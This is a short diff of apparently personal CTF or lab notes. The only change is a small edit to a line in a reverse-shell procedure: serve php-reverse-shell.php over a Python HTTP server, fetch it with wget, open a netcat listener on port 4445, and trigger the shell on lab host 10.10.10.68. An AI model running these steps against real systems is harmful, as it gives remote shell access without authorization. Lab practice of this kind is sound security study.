@@ -47,7 +47,7 @@ chg php IP + Port
 
 local> python -m SimpleHTTPServer 80
 wget na machine
-nc -nvlp 4445
+nc -nvlp 4445 (netcat)
 load 10.10.10.68/php-reverse-shell.php
 
 privilege escalation:
